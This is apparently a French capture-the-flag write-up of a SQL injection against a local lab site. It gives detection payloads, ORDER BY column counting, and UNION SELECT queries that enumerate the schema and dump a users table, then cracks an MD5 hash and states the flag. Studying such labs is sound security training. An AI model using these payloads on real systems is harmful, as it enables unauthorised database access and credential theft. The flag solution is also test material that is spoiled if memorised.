Source:,
- https://www.vaadata.com/blog/fr/injections-sql-principes-impacts-exploitations-bonnes-pratiques-securite/
- https://zestedesavoir.com/tutoriels/945/les-injections-sql-le-tutoriel/les-injections-sql-classiques/affichage-denregistrements/

Une injection SQL se produit lorsqu’un utilisateur malveillant communique une entrée qui modifie la requête SQL envoyée par l’application web à la base de données.

1- Détecter la possibilité d'injection 

Ajouter l’une des payload ci-dessous après notre nom d’utilisateur et voir si cela provoque des erreurs ou modifie le comportement de la page : ‘ / « / # / ; / )

    Sur notre site cela affiche bien une erreur et dans l'URL nous avons la requete envoyee: http://192.168.56.102/index.php?page=signin&username=%27&password=&Login=Login#


2- Trouver le nombre de champs

ORDER BY permet de trier le résultat en précisant le(s) champ(s) ainsi que l'ordre (croissant ou décroissant). Mais ORDER BY peut également trier en se référant à la position du champ dans la requête. Si ce champ n'existe pas, la requête renverra une erreur et c'est exactement de cette manière que nous pouvons déterminer le nombre de champs : 1 ORDER BY 2 => Unknown column '3' in 'order clause'

    Il y a donc 2 champs

    Il faut donc que la requête que nous ferons après le mot UNION comporte très exactement 3 champs.

    1 UNION SELECT 1, 2
    1 UNION SELECT 1, database()
        Cela affiche: Member_Sql_Injection
    1 UNION SELECT 1

    1 UNION SELECT 1, TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = CHAR(77,101,109,98,101,114,95,83,113,108,95,73,110,106,101,99,116,105,111,110)
        Cela affiche: users

    1 UNION SELECT 1, COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = CHAR(77,101,109,98,101,114,95,83,113,108,95,73,110,106,101,99,116,105,111,110) AND TABLE_NAME = CHAR(117,115,101,114,115)
        Cela affiche: me, user_id, first_name, last_name, town, country, planet, Commentaire, countersign

    1 UNION SELECT 1, user_id FROM users 
    1 UNION SELECT 1, first_name FROM users (surname flag au 5)
    1 UNION SELECT 1, last_name FROM users (surname GetThe au 5)
    1 UNION SELECT 1, town FROM users (surname 42)
    1 UNION SELECT 1, country FROM users (surname 42)
    1 UNION SELECT 1, Commentaire FROM users (surname Decrypt this password -> then lower all the char. Sh256 on it and it's good !)
    1 UNION SELECT 1, countersign FROM users (prendre le 5eme)

    md5 decrypt: 5ff9d0165b4f92b14994e5c685cdce28 : FortyTwo
    sha256:9995cae900a927ab1500d317dfcc52c0ad8a521bea878a8e9fa381b41459b646